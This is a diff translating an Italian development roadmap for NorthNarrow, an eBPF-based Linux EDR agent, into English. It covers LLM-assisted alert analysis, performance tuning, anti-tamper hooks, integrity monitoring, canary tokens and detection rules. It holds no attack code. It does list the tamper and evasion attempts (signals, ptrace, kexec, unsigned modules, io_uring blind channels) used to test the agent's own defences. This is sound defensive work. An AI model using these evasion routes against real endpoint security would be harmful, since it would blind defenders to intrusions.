+  structured prompt, placed after the host context and before the
+  untrusted data).
+- `agent::ade::AdeEngine::with_rag(rag)` — opt-in wiring that
+  keeps the pre-6.7 behaviour byte for byte when the
+  RAG is absent (all existing tests keep passing).
 
-Esempi (manual-run, non in CI):
+Examples (manual run, not in CI):
 
-- `examples/rag_demo.rs` — 5 query canoniche → top-3 hit per query.
-- `examples/ade_with_rag.rs` — stesso evento (Cobalt Strike beacon)
-  valutato side-by-side con e senza RAG.
+- `examples/rag_demo.rs` — 5 canonical queries → top-3 hits per query.
+- `examples/ade_with_rag.rs` — the same event (Cobalt Strike beacon)
+  evaluated side by side with and without RAG.
 
-Test: 32 nuovi test sempre-on (8 embedder, 7 store, 4 kb_seed, 8
-retrieval, 5 rag_integration). 0 ignored introdotti dalla 6.7. ADE
-schema invariato (v1.0.0).
+Tests: 32 new always-on tests (8 embedder, 7 store, 4 kb_seed, 8
+retrieval, 5 rag_integration). 0 ignored tests added by 6.7. ADE
+schema unchanged (v1.0.0).
 
-Deviazioni dalla spec (autorizzate dalla spec stessa, documentate
-nei commit):
+Deviations from the spec (allowed by the spec itself, documented
+in the commits):
 
-- LanceDB → vector store custom in-memory (deps troppo pesanti).
-- bge-small candle → hashed n-gram embedder (BERT GGUF non è
-  first-class in candle 0.10, fuori dal MINIMAL scope).
+- LanceDB → custom in-memory vector store (dependencies too heavy).
+- bge-small candle → hashed n-gram embedder (BERT GGUF is not
+  first-class in candle 0.10, outside the MINIMAL scope).
 
-Materiale per Sub-tappa 6.7+: caricamento bge-small reale via
-candle, persistenza on-disk del KB, ingestion da MITRE GitHub /
-Sigma / LOLBAS, threshold-tuning con embeddings semantici.
+Material for Sub-tappa 6.7+: loading a real bge-small through
+candle, on-disk persistence of the KB, ingestion from MITRE GitHub /
+Sigma / LOLBAS, threshold tuning with semantic embeddings.
 
-### Sub-tappa 6.8 — Performance Optimization Pass (chiusa)
+### Sub-tappa 6.8 — Performance Optimization Pass (closed)
 
-Tre leve CPU-side per portare la latency end-to-end di ADE da
-~25 minuti (1500 token a 0.94 tok/s decode su Hetzner CCX23) verso
-i ~5 minuti necessari per uso realtime, senza GPU, senza redesign
-schema, senza cambiare modello (Foundation-Sec 8B Q4_K_M resta).
+Three CPU-side levers to bring the ADE's end-to-end latency from
+~25 minutes (1500 tokens at 0.94 tok/s decode on Hetzner CCX23) towards
+the ~5 minutes needed for real-time use, with no GPU, no schema
+redesign, no change of model (Foundation-Sec 8B Q4_K_M stays).
 
-Strati introdotti:
+Layers introduced:
 
-- **Strato 1 — Hardware diagnostic.** `examples/diag_hw.rs`
-  stampa CPU model, ISA flags, fisici/logici, RAM, e due
-  micro-bench (matmul f32 single-thread + sequential read 1 GB)
-  che identificano se il deployment host è compute-bound o
-  memory-bound. Baseline CCX23: AMD EPYC Milan, AVX2+FMA+F16C,
-  ~19 GFLOPS single-thread, ~36 GB/s — documentato in
+- **Layer 1 — Hardware diagnostic.** `examples/diag_hw.rs`
+  prints the CPU model, ISA flags, physical/logical cores, RAM, and two
+  micro-benchmarks (single-thread f32 matmul + 1 GB sequential read)
+  that tell whether the deployment host is compute-bound or
+  memory-bound. CCX23 baseline: AMD EPYC Milan, AVX2+FMA+F16C,
+  ~19 GFLOPS single-thread, ~36 GB/s — documented in
   `docs/PERFORMANCE_HARDWARE.md`.
-- **Strato 2 — Build flags.** `.cargo/config.toml` esporta
-  `target-cpu=native` (FMA + AVX-512 quando presenti).
-  `[profile.release]` passa da `lto = "thin"` a `lto = "fat"`,
+- **Layer 2 — Build flags.** `.cargo/config.toml` exports
+  `target-cpu=native` (FMA + AVX-512 when present).
+  `[profile.release]` goes from `lto = "thin"` to `lto = "fat"`,
   `codegen-units = 1`, `panic = "abort"`, `opt-level = 3`. Build
-  time ~30 s → ~160 s su CCX23 (peak link RAM ~6-8 GiB, gestibile).
-  Profilo `release-bench` separato preserva i symbol per `perf`.
-  Speedup atteso: 1.3-1.5× su candle CPU kernels.
-- **Strato 3 — Thread tuning.** `AdeConfig` espone
-  `num_threads: Option<usize>` con `effective_threads()` che
-  default-a `physical_cores − 1`. `CandleBackend::configure_threads`
-  pinna `RAYON_NUM_THREADS` prima del primo init del global pool
-  rayon. CLI `--ade-threads N` ovverride. `examples/bench_threads.rs`
-  walkka N ∈ {1,2,3,4} in subprocess (rayon è lazy-init una volta
-  per processo) e stampa l'optimum. Documentato in
+  time ~30 s → ~160 s on CCX23 (peak link RAM ~6-8 GiB, manageable).
+  A separate `release-bench` profile keeps the symbols for `perf`.
+  Expected speedup: 1.3-1.5× on the candle CPU kernels.
+- **Layer 3 — Thread tuning.** `AdeConfig` exposes
+  `num_threads: Option<usize>` with `effective_threads()`, which
+  defaults to `physical_cores − 1`. `CandleBackend::configure_threads`
+  pins `RAYON_NUM_THREADS` before the first init of the global rayon
+  pool. The CLI `--ade-threads N` overrides it. `examples/bench_threads.rs`
+  walks N ∈ {1,2,3,4} in subprocesses (rayon is lazily initialised once
+  per process) and prints the optimum. Documented in
   `docs/PERFORMANCE_THREADS.md`.
-- **Strato 4 — Streaming + early JSON termination.** Il levere
-  più grosso. `InferenceBackend.generate_streaming` (con
-  `StreamControl::Continue|Stop`) è opzionale e default-impl
-  cade su `generate` con singolo callback finale (Mock + altri
-  backend restano byte-compatibili). `CandleBackend` implementa
-  streaming reale: dopo ogni token decoded, tokenizer.decode
-  incrementale produce solo il suffisso nuovo, UTF-8-boundary
-  aware. `agent::ade::streaming_parser::StreamingJsonDetector`
-  traccia brace-depth, string-mode, escape-mode lungo lo stream
-  e segnala completamento al primo `}` outermost.
-  `AdeEngine::evaluate` cabla detector + `Stop`: appena il JSON
-  chiude, il decode loop si ferma. Atteso: ~1500 → ~400-500
-  token decoded per inferenza, 3-4× wall-time saving su host
-  memory-bound.
-- **Strato 5 — Persistent backend audit.** Verificato per
-  ispezione che `AdeEngine::new` viene chiamato una sola volta
-  in `agent/src/main.rs`, fuori dal loop eventi, e l'`Arc<AdeEngine>`
-  risultante viene condiviso in `process_event` per ogni iterazione.
-  Comment-guard aggiunto al construction site per impedire
-  regressioni future.
+- **Layer 4 — Streaming + early JSON termination.** The biggest
+  lever. `InferenceBackend.generate_streaming` (with
+  `StreamControl::Continue|Stop`) is optional, and the default impl
+  falls back to `generate` with a single final callback (Mock + the other
+  backends stay byte-compatible). `CandleBackend` implements
+  real streaming: after each decoded token, an incremental tokenizer.decode
+  produces only the new suffix, aware of UTF-8
+  boundaries. `agent::ade::streaming_parser::StreamingJsonDetector`
+  tracks brace depth, string mode and escape mode along the stream
+  and signals completion at the first outermost `}`.
+  `AdeEngine::evaluate` wires detector + `Stop`: as soon as the JSON
+  closes, the decode loop stops. Expected: ~1500 → ~400-500
+  decoded tokens per inference, a 3-4× wall-time saving on
+  memory-bound hosts.
+- **Layer 5 — Persistent backend audit.** Checked by
+  inspection that `AdeEngine::new` is called only once
+  in `agent/src/main.rs`, outside the event loop, and that the resulting
+  `Arc<AdeEngine>` is shared in `process_event` on every iteration.
+  A comment guard was added at the construction site to prevent
+  future regressions.
 
-Test: 12 nuovi test sempre-on (8 `StreamingJsonDetector` + 3
-`AdeConfig::effective_threads` + 1 integrazione streaming/non-
-streaming verdict-equality). Totale workspace: 277 test passati,
-0 falliti, 5 ignored. Schema `AdeVerdict` invariato (v1.0.0).
+Tests: 12 new always-on tests (8 `StreamingJsonDetector` + 3
+`AdeConfig::effective_threads` + 1 streaming/non-streaming
+verdict-equality integration test). Workspace total: 277 tests passed,
+0 failed, 5 ignored. `AdeVerdict` schema unchanged (v1.0.0).
 ADE pipeline (sanitize, sanity_check, dual_verify, RAG, posture)
-invariata.
+unchanged.
 
-Speedup teorico combinato (NON misurato in autopilot — sarà
-benchato dal founder con `bench_threads` + run reale di
-`ade_demo` post-deploy): ~5×, pari a ~5 minuti per output tipico
-di 1500 token su CCX23.
+Combined theoretical speedup (NOT measured in autopilot — to be
+benchmarked by the founder with `bench_threads` + a real run of
+`ade_demo` after the deploy): ~5×, about ~5 minutes for a typical
+1500-token output on CCX23.
 
-Out of scope, rinviato a sub-tappa successive:
+Out of scope, postponed to later sub-tappe:
 
 - GPU / Metal / CUDA support → Sub-tappa 6.9+.
-- Schema redesign per output compatto → Sub-tappa 6.9 Compact
-  Output (renderebbe lo streaming meno necessario, ma sono
-  ortogonali e indipendenti).
-- Modello più piccolo (Foundation-Sec 8B resta production
+- Schema redesign for a compact output → Sub-tappa 6.9 Compact
+  Output (it would make streaming less necessary, but the two are
+  orthogonal and independent).
+- A smaller model (Foundation-Sec 8B stays the production
   choice).
 - Speculative decoding / draft models.
 
-Deviazioni dalla spec autorizzate, documentate nei commit:
+Allowed deviations from the spec, documented in the commits:
 
-- `lld` non è disponibile sull'host CCX23 (May 2026); la
-  link-arg `-fuse-ld=lld` è stata omessa, default-linker
-  preservato. Build time aumentato di ~30 s rispetto al lld
-  ipotetico, accettabile.
-- Default `effective_threads()` ritorna 1 sul CCX23
-  (2 physical → 2-1 = 1) ma il bench atteso identifica 2-3
-  come optimum reale; il default è conservativo, l'override
-  via CLI è il path produzione.
-
----
-
-## Tappa 7 — Anti-tamper Linux
-
-Obiettivo: l'agent non si può uccidere né disabilitare.
-
-- BPF-LSM hook task_kill — nega SIGKILL/SIGTERM verso il PID
-  dell'agent (escluso un canale firmato Ed25519)
-- BPF-LSM hook ptrace_access_check — nega ptrace al daemon
-- Protezione del filesystem /var/lib/northnarrow/ (chattr +i + LSM)
-- Watchdog: secondo processo che riavvia il daemon se cade
-
-Demo: `sudo kill -9 <pid_agent>` → il segnale viene NEGATO dal
-kernel. Anche root non lo uccide.
+- `lld` is not available on the CCX23 host (May 2026); the
+  `-fuse-ld=lld` link-arg was left out, and the default linker
+  kept. Build time is ~30 s longer than with the hypothetical
+  lld, which is acceptable.
+- The default `effective_threads()` returns 1 on the CCX23
+  (2 physical → 2-1 = 1), but the expected bench finds 2-3
+  as the real optimum; the default is conservative, the CLI
+  override is the production path.
 
 ---
 
-## Tappa 8 — Riattivazione supervisionata (sigillo crittografico)
+## Tappa 7 — Linux anti-tamper
 
-Obiettivo: isolamento di rete che si sblocca solo con chiave admin.
+Goal: the agent cannot be killed or disabled.
 
-- Coppia di chiavi ed25519-dalek. Pubblica nel daemon, privata nel
-  Key Vault aziendale (offline o HSM)
-- Stato di isolamento persistito in file immutabile (chattr +i)
-- Al boot, l'agent legge lo stato. Se "isolato" → blocca rete via
-  nftables/XDP all'avvio prima che tocchi l'OS
-- Comando di sblocco: token firmato Ed25519 inserito dall'admin via CLI
-  locale. Verifica firma → libera la rete
-- Recovery key di emergenza generata all'install, da custodire in
-  cassaforte aziendale
+- BPF-LSM hook task_kill — denies SIGKILL/SIGTERM to the agent's
+  PID (except for an Ed25519-signed channel)
+- BPF-LSM hook ptrace_access_check — denies ptrace to the daemon
+- Protection of the /var/lib/northnarrow/ filesystem (chattr +i + LSM)
+- Watchdog: a second process that restarts the daemon if it goes down
 
-Demo: macchina isolata. Reboot. Resta isolata. Admin inserisce token
-firmato → rete torna su.
+Demo: `sudo kill -9 <pid_agent>` → the signal is DENIED by the
+kernel. Even root does not kill it.
 
 ---
 
-## Tappa 9 — File Integrity Monitoring (chiusa)
+## Tappa 8 — Supervised reactivation (cryptographic seal)
 
-Obiettivo: integrità del filesystem come segnale di prima classe.
+Goal: a network isolation that is lifted only with an admin key.
 
-- Sensori LSM `inode_create/unlink/rename/link/setattr`, `file_open`,
-  `file_permission`, `file_free_security` (8 programmi observe)
-- Baseline firmata (`fim_baseline.jsonl`) + drift log a catena; TOFU
-  al primo avvio, `fim-paths.v1` + overlay `.local`
-- Ruoli `fim-manage` / `fim-read`; prompt ADE per eventi FIM critici
-- 9.0.a/b/c: detections persistite su chainlog firmato, lettura
-  `nn-admin detections` (ruolo `telemetry-read`), triage event-sourced
-  (`detection-set-status`, ruolo `triage`)
+- An ed25519-dalek key pair. The public key in the daemon, the private
+  key in the company Key Vault (offline or HSM)
+- Isolation state persisted in an immutable file (chattr +i)
+- At boot, the agent reads the state. If "isolated" → it blocks the network
+  through nftables/XDP at start, before it touches the OS
+- Unlock command: an Ed25519-signed token entered by the admin through the
+  local CLI. Signature check → the network is released
+- An emergency recovery key generated at install, to be kept in the
+  company safe
+
+Demo: an isolated machine. Reboot. It stays isolated. The admin enters a
+signed token → the network comes back up.
+
+---
+
+## Tappa 9 — File Integrity Monitoring (closed)
+
+Goal: filesystem integrity as a first-class signal.
+
+- LSM sensors `inode_create/unlink/rename/link/setattr`, `file_open`,
+  `file_permission`, `file_free_security` (8 observe programs)
+- Signed baseline (`fim_baseline.jsonl`) + chained drift log; TOFU
+  at first start, `fim-paths.v1` + `.local` overlay
+- Roles `fim-manage` / `fim-read`; ADE prompt for critical FIM events
+- 9.0.a/b/c: detections persisted on a signed chainlog, read with
+  `nn-admin detections` (role `telemetry-read`), event-sourced triage
+  (`detection-set-status`, role `triage`)
 
 Design: `docs/design/TAPPA9_FIM_DESIGN.md`,
 `docs/operator/TAPPA9_FIM_TRUST_MODEL.md`.
 
 ---
 
-## Tappa 9.5 — Deception layer / canary token (chiusa)
+## Tappa 9.5 — Deception layer / canary token (closed)
 
-- Canary di credenziali (aws, azure, gcp, docker, generic) renderizzati
-  da template, registro a catena, scatto su READ e su exec; dal lab PR 163
-  anche il canary di rete: scatta al connect di un processo locale verso
-  il suo indirizzo e porta (l'agente non apre listener)
-- 9.5.1: honeypot anti-tamper — 10 file esca sulla superficie di
-  controllo (`/etc`, `/var/lib`, `/run`), regola NN-L-FIM-024
-- Ruoli `canary-manage` / `canary-read`; policy di percorso sul deploy
+- Credential canaries (aws, azure, gcp, docker, generic) rendered
+  from templates, a chained registry, firing on READ and on exec; since lab PR 163
+  also the network canary: it fires when a local process connects to
+  its address and port (the agent opens no listener)
+- 9.5.1: anti-tamper honeypot — 10 decoy files on the control
+  surface (`/etc`, `/var/lib`, `/run`), rule NN-L-FIM-024
+- Roles `canary-manage` / `canary-read`; path policy on the deploy
 
 Design: `docs/design/TAPPA9_5_DECEPTION_LAYER_DESIGN.md`,
 `docs/design/TAPPA9_5_1_ANTITAMPER_HONEYPOT_DESIGN.md`.
 
 ---
 
-## Tappa 10 — Osservabilità di rete (chiusa)
+## Tappa 10 — Network observability (closed)
 
 - kprobe `tcp_connect` v4/v6, fexit `tcp_close`, kprobe `udp_sendmsg`
-  (connesso e non connesso), `inet_csk_listen_start`
-- Flow tracker con `flow_id` stabile, cache DNS per PID, parser TLS
-  con JA3/JA4, blocklist IP/CIDR e JA3 con overlay `.local`
-- 9 regole NN-L-NET, `nn-admin net flows|listeners|resolve|fingerprint`
-  (ruoli `net-read` / `net-manage`), chain log `netflow.jsonl`
+  (connected and unconnected), `inet_csk_listen_start`
+- Flow tracker with a stable `flow_id`, DNS cache per PID, TLS parser
+  with JA3/JA4, IP/CIDR and JA3 blocklist with a `.local` overlay
+- 9 NN-L-NET rules, `nn-admin net flows|listeners|resolve|fingerprint`
+  (roles `net-read` / `net-manage`), chain log `netflow.jsonl`
 
 Design: `docs/design/TAPPA10_NETWORK_OBSERVABILITY_DESIGN.md`.
 
 ---
 
-## Tappa 10.5 — Detection rules at scale (chiusa)
+## Tappa 10.5 — Detection rules at scale (closed)
 
-- Motore a 69 regole (R001–R018 di processo, NN-L-FIM, NN-L-NET, …),
-  allowlist di comm per famiglia con overlay `.local`
-- Correlazione per host, catene CHAIN-004..008
+- A 69-rule engine (process R001–R018, NN-L-FIM, NN-L-NET, …),
+  comm allowlist per family with a `.local` overlay
+- Per-host correlation, chains CHAIN-004..008
 
 Design: `docs/design/TAPPA10_5_DETECTION_RULES_AT_SCALE_DESIGN.md`.
 
 ---
 
-## Tappa 10.6 — Detection depth refit (chiusa)
+## Tappa 10.6 — Detection depth refit (closed)
 
-- argv e contesto del parent nel tracepoint `sched_process_exec`,
-  seed RAG argv-aware, golden suite a 30 casi
+- argv and parent context in the `sched_process_exec` tracepoint,
+  argv-aware RAG seed, 30-case golden suite
 
 Design: `docs/design/TAPPA10_6_DETECTION_DEPTH_REFIT_DESIGN.md`.
 
 ---
 
-## Tappa 10.7 — Validazione avversariale via Kali Linux (in corso)
+## Tappa 10.7 — Adversarial validation through Kali Linux (in progress)
 
-- Design chiuso con le 10 decisioni del founder; range VirtualBox
-  automatizzato (`deploy/adversarial/`), sweep Atomic Red Team v2
+- Design closed with the founder's 10 decisions; automated VirtualBox
+  range (`deploy/adversarial/`), Atomic Red Team v2 sweep
   (`docs/adversarial/`)
-- Da fare: esecuzione sistematica delle catene e chiusura dei gap
-  trovati nel registro
-- Suite di regressione PANIX (persistenza) e FENIX (esecuzione fileless)
-  di Elastic accanto ad Atomic Red Team (ricerca esterna dell'11 ottobre,
+- To do: run the chains systematically and close the gaps
+  found in the register
+- Elastic's PANIX (persistence) and FENIX (fileless execution) regression
+  suites next to Atomic Red Team (external research of 11 October,
   `docs/design/RESEARCH_TRIAGE_2026-10-11.md`)
 
 Design: `docs/design/TAPPA10_7_ADVERSARIAL_VALIDATION_DESIGN.md`.
 
 ---
 
-## Tappa 10.8 — Affidabilità, compatibilità multi-kernel, supply chain (in corso)
+## Tappa 10.8 — Reliability, multi-kernel compatibility, supply chain (in progress)
 
-Obiettivo: NorthNarrow installabile, aggiornabile e verificabile su un
-host vero, non solo sul kernel di sviluppo. Lavoro trasversale: non
-cambia l'ordine delle Tappe successive.
+Goal: NorthNarrow can be installed, upgraded and verified on a
+real host, not only on the development kernel. Cross-cutting work: it does
+not change the order of the later Tappe.
 
-Chiuso (8–9 ottobre 2026):
-- Giro di hardening: 27 rilievi dei registri di audit e review
-  (CAP_KILL, kill-tree, quarantena, task_kill deny-by-default, respawn
-  v2 del watchdog, audit chain scrivibile, UDP non connesso, ledger
-  COMBAT per sessione, …) — tutti verificati nel lab QEMU
-- Laboratorio `deploy/lab/nn-lab.sh`: quattro guest (Ubuntu 24.04 / 6.8,
-  Debian 12 / 6.1, Ubuntu 22.04 / 5.15, AlmaLinux 9 / 5.14 con SELinux
-  enforcing), nightly con e2e (agent, FIM, watchdog), suite ignorate,
-  install, upgrade, uninstall, respawn-check; report in
-  `~/.cache/nn-lab/<distro>/reports/`; `soak start|wait|report` per i
-  test di durata (10 ottobre)
-- `install.sh --upgrade` e `uninstall.sh` (ordine imposto dall'anti-tamper)
-- Release su tag `v*`: tarball, SBOM CycloneDX, `SHA256SUMS`,
-  attestazione di provenienza SLSA (`gh attestation verify`)
+Closed (8–9 October 2026):
+- Hardening round: 27 findings from the audit and review registers
+  (CAP_KILL, kill-tree, quarantine, task_kill deny-by-default, watchdog
+  respawn v2, writable audit chain, unconnected UDP, per-session COMBAT
+  ledger, …) — all verified in the QEMU lab
+- Lab `deploy/lab/nn-lab.sh`: four guests (Ubuntu 24.04 / 6.8,
+  Debian 12 / 6.1, Ubuntu 22.04 / 5.15, AlmaLinux 9 / 5.14 with SELinux
+  enforcing), nightly with e2e (agent, FIM, watchdog), ignored suites,
+  install, upgrade, uninstall, respawn-check; reports in
+  `~/.cache/nn-lab/<distro>/reports/`; `soak start|wait|report` for the
+  endurance tests (10 October)
+- `install.sh --upgrade` and `uninstall.sh` (order imposed by the anti-tamper)
+- Release on a `v*` tag: tarball, CycloneDX SBOM, `SHA256SUMS`,
+  SLSA provenance attestation (`gh attestation verify`)
 
-- Multi-kernel, livello 1 (9 ottobre): offset BTF risolti a runtime
-  dalla BTF del kernel vivo e pubblicati nella mappa `BTF_OFFSETS` prima
-  dell'attach; varianti per `iov_iter` (≤ 6.3), enumeratori `ITER_UBUF`
-  e `ITER_IOVEC` risolti per nome, QNAME DNS anche su `ITER_IOVEC`.
-  Debian 12 / 6.1 esegue tutte le suite (e2e e ignorate) come Ubuntu
-  24.04 / 6.8 (rilievo 27 chiuso, `docs/operator/KERNEL_COMPATIBILITY.md`)
+- Multi-kernel, level 1 (9 October): BTF offsets resolved at runtime
+  from the live kernel's BTF and published in the `BTF_OFFSETS` map before
+  the attach; variants for `iov_iter` (≤ 6.3), the `ITER_UBUF`
+  and `ITER_IOVEC` enumerators resolved by name, DNS QNAME also on `ITER_IOVEC`.
+  Debian 12 / 6.1 runs all the suites (e2e and ignored) like Ubuntu
+  24.04 / 6.8 (finding 27 closed, `docs/operator/KERNEL_COMPATIBILITY.md`)
 
-Pianificato, in quest'ordine:
-- Multi-kernel, livello 2 (in corso): fatto il 10 ottobre — campi
-  opzionali (degrado invece di rifiuto), `--btf-check`, terzo guest
-  Ubuntu 22.04 / 5.15 verificato end-to-end (tre costrutti riscritti per
-  il verifier vecchio), matrice calcolata su BTFHub in CI con baseline
-  (`deploy/btf-matrix/`), quarto guest AlmaLinux 9 / 5.14 con SELinux
-  enforcing (layout dei tracepoint risolto da tracefs: il kernel RHEL
-  sposta i campi di 4 byte); resta la BTF esterna per kernel senza BTF
-- Test di durata 24–72 h con traffico sintetico (memoria, chain log,
-  mappe LRU, timer): strumento pronto (`nn-lab.sh soak`), prima run da
-  24 h su AlmaLinux 9 superata il 12 ottobre (RSS +0,04 MB/h, nessun
-  riavvio né errore, fd stabili); le 72 h richiedono un host sempre acceso
-- Verifica della provenienza all'installazione (fatta il 10 ottobre, lab
-  PR 21): `install.sh` controlla
-  `SHA256SUMS` e l'attestazione SLSA del tarball (builder atteso: il
-  workflow di release di questo repository, nessun altro) e rifiuta un
-  upgrade non verificabile; esito registrato nell'audit log; `cargo audit`
-  anche a calendario settimanale, non solo sui push, perché la SBOM è un
-  inventario e va riconfrontata con gli advisory; all'avvio l'agent
-  confronta l'hash del proprio binario, del watchdog e dell'oggetto eBPF
-  con il manifest firmato dell'installazione (ri-verifica continua, non
-  solo al deploy)
-- Controlli di hardening dell'host (fatti l'11 ottobre, lab PR 24) in
-  `install.sh`, `nn-admin host-check`/`status` e al boot dell'agent:
-  modalità `lockdown` del kernel, `kernel.unprivileged_bpf_disabled`,
-  `module.sig_enforce`, Secure Boot (efivars), IMA/EVM attivi, bpffs
-  montato una sola volta; ogni assenza è un WARN con la riga di fix,
-  perché l'anti-tamper dell'agent vale finché root non può riscrivere il
-  kernel a caldo (kexec, moduli non firmati, livepatch)
-- Contatori di perdita del ring buffer (fatti l'11 ottobre, lab PR 25): un
-  contatore per ring in eBPF, letti dall'agent ogni 10 s, WARN a ogni
-  aumento, totale e dettaglio in `nn-admin status`
-- Fuzzing dei parser (fatto l'11 ottobre, lab PR 26): otto target cargo-fuzz
-  (frame admin, TLS ClientHello, DNS, BTF, `format` di tracefs, ruoli,
-  righe del chain log, install manifest) con job CI di smoke; coperti l'11
-  ottobre anche l'innesto delle eccezioni di gestione nelle regole COMBAT e
-  i template canary (lab PR 42), con proprietà di sicurezza oltre al «nessun
-  panico»: nessun contenuto del file delle eccezioni può iniettare una regola
-- Sensore `io_uring` (fatto l'11 ottobre, lab PR 27 — prima parte: osservazione
-  e regole Log; le correlazioni con le catene e il carve-out per identità
-  restano in 10.9): tracepoint su `io_uring_create` e `io_uring_submit`,
-  opcode delle SQE (open, read/write, connect, send/recv, unlink,
-  rename) correlati a processo e file; regole su ring usati subito dopo
-  un exec da path volatile e su I/O senza syscall corrispondenti (il
-  bypass EDR più concreto del 2025–2026: RingReaper)
-- Autodifesa dell'ecosistema BPF (prima metà fatta l'11 ottobre, lab PR 28:
-  guardia `bpf_map` in deny sulle mappe proprie, osservatore `bpf()` con
-  regole Log, modalità observe nei build di test; seconda metà fatta l'11
-  ottobre, lab PR 29: handle ai link negati per id e per pin, id distinti per
-  tipo, self-check dei link ogni 10 s con voce di audit, pin root protetto
-  dall'unlink con purge autorizzato via finestra trusted-installer —
-  rilievo 39 — in `install.sh --upgrade --grant-key` e `uninstall.sh`;
-  resta la sonda di telemetria): hook LSM `bpf`/`bpf_prog`/`bpf_map`
-  che nega carico, attach, detach, enumerazione e scrittura di mappe a
-  chiunque non sia l'agent; baseline dei programmi BPF legittimi all'avvio;
-  self-check periodico che i link dell'agent siano ancora attaccati
-- Sonda di telemetria continua (fatta l'11 ottobre, lab PR 30 — prima
-  parte: exec, apertura file, DNS; rete TCP e FIM restano, perché una
-  connessione periodica e una modifica a un path sorvegliato farebbero
-  scattare regole legittime e servono prima le esenzioni per identità di
-  10.9): l'agent genera a intervalli eventi noti e innocui su ogni
-  sensore e verifica di vederli entro pochi secondi; evento mancante o
-  hook assente = voce `telemetry_gap` nell'audit firmato e ERROR nel
-  journal, `telemetry_restored` al ritorno (prova di copertura come
-  funzione di prodotto, non solo come test di laboratorio)
-- Test avversariale strutturato dell'anti-tamper (prima parte fatta l'11
-  ottobre, lab PR 31: `nn-lab.sh tamper-check`, 20 casi con esito atteso ed
-  evidenza nei chain log firmati — segnali, ptrace, file e pin protetti,
-  mappe/link/programmi BPF, drop-in e `set-property`, bpffs e bind mount,
-  cgroup freezer, moduli, `oom_score_adj`, overlay `.local`; trovati e
-  chiusi i rilievi 40–44; seconda parte fatta l'11 ottobre, lab PR 32:
-  `cgroup.kill`, saturazione con un exec nascosto in un flood, io_uring come
-  canale cieco — 23 casi, rilievo 46 chiuso (ogni run firma `agent_stop`, il
-  boot successivo dichiara se il precedente è finito in modo pulito);
-  kexec/livepatch/modulo non firmato con `lockdown` attivo fatto l'11
-  ottobre, lab PR 43, su Ubuntu 22.04 con `lockdown=integrity`: l'agent
-  gira invariato, kexec (C17) e un modulo con la firma tolta caricato con
-  `finit_module` (C27, livepatch compresi) sono rifiutati dal kernel e il
-  tentativo resta registrato da R018 — 28 casi; `host-check` conta il
-  lockdown come firma dei moduli imposta; ogni caso deve finire in un
-  evento nel chain log, non solo in un rifiuto)
-- Overlay `.local` solo via `nn-admin` firmato (fatto l'11 ottobre, lab
-  PR 33): l'agent carica un overlay solo se `<overlay>.sig` dimostra che
-  una chiave con il ruolo `config-manage` ne ha firmato il contenuto
-  esatto, per questo agent e non prima dell'ultima firma accettata (niente
-  rollback); altrimenti usa i default di quella lista e registra
+Planned, in this order:
+- Multi-kernel, level 2 (in progress): done on 10 October — optional
+  fields (degrade instead of refuse), `--btf-check`, a third guest
+  Ubuntu 22.04 / 5.15 verified end to end (three constructs rewritten for
+  the old verifier), a matrix computed on BTFHub in CI with a baseline
+  (`deploy/btf-matrix/`), a fourth guest AlmaLinux 9 / 5.14 with SELinux
+  enforcing (tracepoint layout resolved from tracefs: the RHEL kernel
+  shifts the fields by 4 bytes); still open: external BTF for kernels without BTF
+- Endurance tests of 24–72 h with synthetic traffic (memory, chain logs,
+  LRU maps, timers): the tool is ready (`nn-lab.sh soak`), the first
+  24 h run on AlmaLinux 9 passed on 12 October (RSS +0.04 MB/h, no
+  restart or error, stable fds); the 72 h need a host that is always on
+- Provenance check at install (done on 10 October, lab
+  PR 21): `install.sh` checks
+  `SHA256SUMS` and the tarball's SLSA attestation (expected builder: the
+  release workflow of this repository, no other) and refuses an
+  upgrade it cannot verify; the outcome is recorded in the audit log; `cargo audit`
+  also on a weekly schedule, not only on pushes, because the SBOM is an
+  inventory and must be compared with the advisories again; at start the agent
+  compares the hash of its own binary, of the watchdog and of the eBPF object
+  with the install's signed manifest (continuous re-verification, not
+  only at deploy)
+- Host hardening checks (done on 11 October, lab PR 24) in
+  `install.sh`, `nn-admin host-check`/`status` and at agent boot:
+  the kernel's `lockdown` mode, `kernel.unprivileged_bpf_disabled`,
+  `module.sig_enforce`, Secure Boot (efivars), IMA/EVM active, bpffs
+  mounted only once; each one missing is a WARN with the fix line,
+  because the agent's anti-tamper holds only as long as root cannot rewrite the
+  kernel live (kexec, unsigned modules, livepatch)
+- Ring buffer loss counters (done on 11 October, lab PR 25): one
+  counter per ring in eBPF, read by the agent every 10 s, a WARN at every
+  increase, total and detail in `nn-admin status`
+- Parser fuzzing (done on 11 October, lab PR 26): eight cargo-fuzz targets
+  (admin frame, TLS ClientHello, DNS, BTF, tracefs `format`, roles,
+  chain log lines, install manifest) with a CI smoke job; on 11
+  October the grafting of management exceptions into the COMBAT rules and
+  the canary templates were covered too (lab PR 42), with security properties beyond "no
+  panic": no content of the exceptions file can inject a rule
+- `io_uring` sensor (done on 11 October, lab PR 27 — first part: observation
+  and Log rules; the correlations with the chains and the carve-out by identity
+  stay in 10.9): tracepoints on `io_uring_create` and `io_uring_submit`,
+  SQE opcodes (open, read/write, connect, send/recv, unlink,
+  rename) correlated with process and file; rules on rings used right after
+  an exec from a volatile path and on I/O with no matching syscalls (the
+  most concrete EDR bypass of 2025–2026: RingReaper)
+- BPF ecosystem self-defence (first half done on 11 October, lab PR 28:
+  `bpf_map` guard in deny on its own maps, `bpf()` observer with
+  Log rules, observe mode in test builds; second half done on 11
+  October, lab PR 29: handles to links denied by id and by pin, ids distinct per
+  type, link self-check every 10 s with an audit entry, root pin protected
+  from unlink, with a purge authorised through the trusted-installer window —
+  finding 39 — in `install.sh --upgrade --grant-key` and `uninstall.sh`;
+  the telemetry probe is still open): LSM hooks `bpf`/`bpf_prog`/`bpf_map`
+  that deny loading, attach, detach, enumeration and map writes to
+  anyone who is not the agent; a baseline of the legitimate BPF programs at start;
+  a periodic self-check that the agent's links are still attached
+- Continuous telemetry probe (done on 11 October, lab PR 30 — first
+  part: exec, file open, DNS; TCP network and FIM stay open, because a
+  periodic connection and a change to a watched path would
+  fire legitimate rules, and they first need the identity exemptions of
+  10.9): at intervals the agent generates known, harmless events on each
+  sensor and checks that it sees them within a few seconds; a missing event or
+  an absent hook = a `telemetry_gap` entry in the signed audit and an ERROR in the
+  journal, `telemetry_restored` when it comes back (proof of coverage as a
+  product function, not only as a lab test)
+- Structured adversarial test of the anti-tamper (first part done on 11
+  October, lab PR 31: `nn-lab.sh tamper-check`, 20 cases with an expected outcome and
+  evidence in the signed chain logs — signals, ptrace, protected files and pins,
